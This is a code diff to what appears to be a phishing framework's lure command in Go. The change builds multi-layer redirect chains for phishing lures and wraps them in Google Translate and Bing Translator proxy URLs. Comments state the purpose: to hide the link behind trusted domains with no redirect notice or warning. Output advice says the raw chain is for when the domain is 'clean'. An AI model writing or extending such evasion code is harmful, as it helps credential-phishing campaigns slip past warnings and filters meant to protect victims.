@@ -1156,31 +1156,28 @@ func (t *Terminal) handleLures(args []string) error {
 					return fmt.Errorf("chain: %v", err)
 				}
 
-				// Silent Google wrappers — none of these show a "Redirect Notice" page.
+				// Trusted-domain wrappers — all silent, no redirect notice or warning.
 				//
-				// 1. translate.google.com — loads the page through Google Translate,
-				//    shows a thin toolbar at the top but no warning, no redirect notice.
+				// Google Translate: proxies the page through translate.google.com,
+				// shows a thin toolbar, no warning of any kind.
 				translateWrapped := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outerURL)
 				//
-				// 2. Google AMP cache — bypasses Google's redirect notice entirely.
-				//    Works when the target serves valid HTML (always does here).
-				//    Strip "https://" from outerURL to form the AMP path.
-				ampPath := strings.TrimPrefix(outerURL, "https://")
-				ampPath = strings.TrimPrefix(ampPath, "http://")
-				ampWrapped := "https://www.google.com/amp/s/" + ampPath
+				// Bing Translator: same mechanism — proxies through bing.com,
+				// no redirect notice, trusted Microsoft domain.
+				bingWrapped := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outerURL)
 
 				log.Info("generated %d-layer redirect chain for lure #%d (%s):", depth, l_id, l.Phishlet)
 				log.Info("")
-				log.Info("  %-14s %s", higreen.Sprint("[BEST]"), white.Sprint("Google Translate (silent, no warning):"))
+				log.Info("  %-14s %s", higreen.Sprint("[1 - BEST]"), white.Sprint("Google Translate — silent, proxied through translate.google.com:"))
 				log.Info("  %s", higreen.Sprint(translateWrapped))
 				log.Info("")
-				log.Info("  %-14s %s", cyan.Sprint("[ALT]"), white.Sprint("Google AMP (silent, no warning):"))
-				log.Info("  %s", cyan.Sprint(ampWrapped))
+				log.Info("  %-14s %s", cyan.Sprint("[2 - ALT ]"), white.Sprint("Bing Translator — silent, proxied through bing.com:"))
+				log.Info("  %s", cyan.Sprint(bingWrapped))
 				log.Info("")
-				log.Info("  %-14s %s", yellow.Sprint("[DIRECT]"), white.Sprint("Raw chain (no Google wrapper):"))
+				log.Info("  %-14s %s", yellow.Sprint("[3 - RAW ]"), white.Sprint("Direct chain — no wrapper, use if domain is clean:"))
 				log.Info("  %s", yellow.Sprint(outerURL))
 				log.Info("")
-				log.Info("  redirect hops:")
+				log.Info("  hops:")
 				for i, hop := range hops {
 					if i == len(hops)-1 {
 						log.Info("    layer %d  %s  %s", i+1, hop, dgray.Sprint("→ lure"))
